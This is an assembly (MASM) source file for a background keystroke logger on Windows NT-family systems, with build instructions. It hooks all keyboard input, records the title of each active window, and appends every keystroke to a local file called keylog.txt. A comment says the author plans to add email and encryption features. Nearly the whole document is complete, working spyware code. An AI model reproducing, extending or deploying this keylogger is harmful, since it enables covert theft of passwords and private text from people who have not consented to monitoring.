comment ~

	This is skeleton of a very basic key logger for (ANSI keyboards) Windows NT 3.51 or greater,
	including NT4/Win2k/XP & 2k3.

	It will run in the background, and log all keystrokes to a file named "keylog.txt"
	
	Shows neat way of formatting key codes.
	GetKeyNameText is used rather than ascii table to format unprintable characters
	such as F1/F12, ESC,CTRL..etc.
	
	its not finished idea, would still like email/encryption engine, filter out
	garbage data..maybe in future version.;;

	Terminate it with a combination of CTRL + ALT + F12
	Tested on Win2k only.

	Win95/98/ME/MAC are not supported.

	Compiles with MASM.

	ml /Cp /coff /c /I C:\MASM32\INCLUDE klogski.asm
	link /SUBSYSTEM:WINDOWS /LIBPATH:C:\MASM32\LIB klogski.obj

	-------------------------------------[April 2004
	
	If MSVCRT.INC is not included with MASM package..
	
	you can define in seperate file as follows:
	
	fopen PROTO C :DWORD, :DWORD
	fprintf PROTO C :DWORD, :VARARG
	fflush PROTO C :DWORD
	fclose PROTO C :DWORD
	
	Then use INC2L.EXE from MASM package to generate LIBRARY file.
	
	BTW: The INCLUDELIB directive is written at the top of each *.INC file..
	
	Other than that, comments are included, good luck.
~
.586
.model flat, stdcall

include <windows.inc>
include <user32.inc>
include <kernel32.inc>
include <msvcrt.inc>

pushz	macro szText:VARARG
	local	nexti
	call	nexti
	db	szText,00h
nexti:
endm

.data

hHook			dd	0
msg			MSG	<>
hFile			dd	0
hCurrentWindow	dd	0

.code
main:
	xor	ebx, ebx
	push	VK_F12		; this will switch logger off using CTRL+ALT+F12 together
	push	MOD_CONTROL or MOD_ALT
	push	0badfaceh		; name of register key -> "0BADFACE"
	push	ebx			; 
	call	RegisterHotKey	; 

	pushz	"ab"			; append in binary mode
	pushz	"keylog.txt"	; name of log file
	call	fopen
	add	esp, 2*4		; all c lib functions need fixup..
	mov	[hFile], eax

	push	ebx
	call	GetModuleHandleA
	
	push	ebx
	push	eax
	push	offset KeyBoardProc
	push	13				; low level key logger
	call	SetWindowsHookExA
	mov	[hHook], eax

	push	ebx
	push	ebx
	push	ebx
	push	offset msg
	call	GetMessageA
	
	push	[hHook]
	call	UnhookWindowsHookEx

	push	[hFile]
	call	fclose
	add	esp, 04

	push	eax
	call	ExitProcess

;##############################################################

KeyBoardProc	PROC	nCode:DWORD, wParam:DWORD, lParam:DWORD
	LOCAL	lpKeyState[256]	:BYTE
	LOCAL	lpCharBuf[32]	:BYTE
	;----------------------------

	lea	edi, [lpKeyState]
	push	256/4
	pop	ecx
	xor	eax, eax
	rep	stosd

	mov	eax, wParam
	cmp	eax, WM_KEYUP
	je	next_hook
	
	cmp	eax, WM_SYSKEYUP
	je	next_hook

	call	GetForegroundWindow		; get handle for currently used window ( specific to NT )
	cmp	[hCurrentWindow], eax		; if its different to last one saved..
	je	no_window_change			;

	mov	[hCurrentWindow], eax		; ..save it and 
	push	256					; get title text for it
	lea	esi, [lpKeyState]
	push	esi
	push	eax
	call	GetWindowText
	
	push	esi
	pushz	13,10,"[CURRENT WINDOW TEXT:%s]",13,10
	push	[hFile]
	call	fprintf
	add	esp, 3*4
	
	push	[hFile]
	call	fflush			; flush data buffer to disk..
	add	esp, 4

no_window_change:	
	mov	esi, [lParam]		; we don't want to print shift or capslock names.
	lodsd					; it just makes the logs easier to read without them.
	cmp	al, VK_LSHIFT		; they are tested later when distinguishing between
	je	next_hook			; upper/lowercase characters.
	cmp	al, VK_RSHIFT
	je	next_hook
	cmp	al, VK_CAPITAL
	je	next_hook
	cmp	al, VK_ESCAPE
	je	get_name_of_key
	cmp	al, VK_BACK
	je	get_name_of_key
	cmp	al, VK_TAB			; print tab keys
	je	get_name_of_key
	;------------------
	lea	edi, [lpCharBuf]		; zero initialise buffer for key text
	push	32/4
	pop	ecx
	xor	eax, eax
	rep	stosd
	;----------
	lea	ebx, [lpKeyState]
	push	ebx
	call	GetKeyboardState			; get current keyboard state

	push	VK_LSHIFT				; test if left shift key held down
	call	GetKeyState
	xchg	esi, eax				; save result in esi
	
	push	VK_RSHIFT				; test right..
	call	GetKeyState
	or	eax, esi				; al == 1 if either key is DOWN
	
	mov	byte ptr [ebx + 16], al		; toggle a shift key to on/off
	
	push	VK_CAPITAL
	call	GetKeyState				; returns TRUE if caps lock is on	
	mov	byte ptr [ebx + 20], al		; toggle caps lock to on/off

	mov	esi, [lParam]
	lea	edi, [lpCharBuf]
	push	00h
	push	edi					; buffer for ascii characters
	push	ebx					; keyboard state
	lodsd
	xchg	eax, edx
	lodsd
	push	eax					; hardware scan code
	push	edx					; virutal key code
	call	ToAscii				; convert to human readable characters
	test	eax, eax				; if return zero, continue
	jnz	test_carriage_return		; else, write to file.

get_name_of_key:			; no need for large table of pointers to get asciiz 
	mov	esi, [lParam]
	lodsd			; skip virtual key code
	lodsd			; eax = scancode
	shl	eax, 16
	xchg	eax, ecx
	lodsd			; extended key info
	shl	eax, 24
	or	ecx, eax

	push	64
	lea	edi, [lpCharBuf]
	push	edi
	push	ecx
	call	GetKeyNameTextA

	push	edi
	pushz	"[%s]"
	jmp	write_to_file

test_carriage_return:
	push	edi
	pushz	"%s"

	cmp	byte ptr [edi], 0dh		; carriage return?
	jne	write_to_file

	mov	byte ptr [edi + 1], 0ah		; add linefeed, so logs are easier to read.
write_to_file:
	push	[hFile]
	call	fprintf
	add	esp, 2*4
next_hook:
	push	[lParam]
	push	[wParam]
	push	[nCode]
	push	[hHook]
	call	CallNextHookEx
	ret
KeyBoardProc	ENDP

end	main